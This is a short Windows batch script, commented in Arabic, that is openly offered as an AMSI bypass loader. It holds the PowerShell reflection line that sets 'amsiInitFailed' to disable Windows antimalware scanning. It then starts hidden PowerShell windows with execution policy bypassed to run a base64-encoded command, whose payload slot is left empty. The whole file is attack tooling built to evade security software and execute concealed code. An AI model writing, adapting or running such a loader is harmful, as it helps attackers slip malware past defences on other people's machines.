@echo off
:: كود إعماء نظام الحماية AMSI Bypass
set "AMSI=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

:: تشغيل الكود المشفر بالكامل في سطر واحد مخفي
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "%AMSI%; $c = ''; powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $c"
